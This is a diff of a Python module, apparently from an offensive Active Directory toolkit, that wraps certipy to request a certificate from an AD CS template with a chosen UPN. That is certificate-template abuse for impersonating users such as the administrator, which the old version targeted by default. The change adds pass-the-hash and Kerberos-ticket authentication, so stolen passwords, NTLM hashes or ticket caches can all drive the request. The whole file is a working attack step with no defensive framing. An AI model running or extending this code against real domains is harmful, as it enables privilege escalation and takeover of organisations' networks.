@@ -1,64 +1,93 @@
 import subprocess
+import os
 from pathlib import Path
+
 
 def run(data, cred, args):
     extra = getattr(args, "extra", []) or []
 
     if not extra:
         print("[-] Missing template name")
-        return data
+        return None
 
     template = extra[0]
 
-    # -------------------------
-    # Optional args
-    # -------------------------
-    target_user = "administrator"
+    request_upn = None
+    ca = None
     dns = None
-    out_dir = None # Added for path control
+    out_dir = None
 
-    for i in range(len(extra)):
+    i = 0
+    while i < len(extra):
         if extra[i] == "--user" and i + 1 < len(extra):
-            target_user = extra[i + 1]
-        if extra[i] == "--dns" and i + 1 < len(extra):
+            request_upn = extra[i + 1]
+            i += 1
+        elif extra[i] == "--ca" and i + 1 < len(extra):
+            ca = extra[i + 1]
+            i += 1
+        elif extra[i] == "--dns" and i + 1 < len(extra):
             dns = extra[i + 1]
-        if extra[i] == "--out" and i + 1 < len(extra): # New check
-            out_dir = Path(extra[i + 1])
+            i += 1
+        elif extra[i] == "--out" and i + 1 < len(extra):
+            out_dir = Path(extra[i + 1]).expanduser().resolve()
+            i += 1
+        i += 1
 
-    # ... [Keep Resolve target/CA/cred logic the same] ...
-    ip = data.get("ip")
     domain = data.get("domain")
-    ca = data.get("adcs", {}).get("ca")
-    username = cred.get("user")
-    password = cred.get("secret") if cred.get("type") == "password" else None
+    ip = data.get("ip")
 
-    # -------------------------
-    # Build command
-    # -------------------------
+    if not ca:
+        ca = data.get("adcs", {}).get("ca")
+
+    # ✅ TRUST THE PASSED CRED
+    auth_user = cred.get("user")
+    typ = cred.get("type")
+    secret = cred.get("secret")
+
+    if not template or not auth_user or not domain or not ip or not ca:
+        print("[-] Missing required values")
+        return None
+
+    # default UPN
+    if not request_upn:
+        request_upn = auth_user
+
+    if "@" not in request_upn:
+        request_upn = f"{request_upn}@{domain}"
+
     cmd = [
-        "certipy", "req",
-        "-username", username,
-        "-password", password,
+        "certipy-ad", "req",
+        "-username", f"{auth_user}@{domain}",
         "-ca", ca,
         "-dc-ip", ip,
         "-template", template,
-        "-upn", f"{target_user}@{domain}",
-        "-debug"
+        "-upn", request_upn
     ]
 
+    if typ == "password":
+        cmd += ["-password", secret]
+
+    elif typ == "ntlm":
+        ntlm = secret if ":" in secret else f":{secret}"
+        cmd += ["-hashes", ntlm]
+
+    elif typ == "ticket":
+        os.environ["KRB5CCNAME"] = secret
+        cmd += ["-k", "-no-pass"]
+
+    else:
+        print("[-] Unsupported credential type")
+        return None
+
     if dns:
-        cmd.extend(["-dns", dns])
+        cmd += ["-dns", dns]
+
+    cmd += ["-debug"]
+
+    cmd = [str(x) for x in cmd]
 
     print(f"[*] Running: {' '.join(cmd)}")
 
-    # -------------------------
-    # Execute with CWD
-    # -------------------------
-    try:
-        # If out_dir is provided, certipy will drop the .pfx there
-        subprocess.run(cmd, cwd=out_dir) 
-    except Exception as e:
-        print(f"[-] Execution failed: {e}")
-        return data
+    result = subprocess.run(cmd, cwd=out_dir)
 
-    return data
+    return {"success": result.returncode == 0}
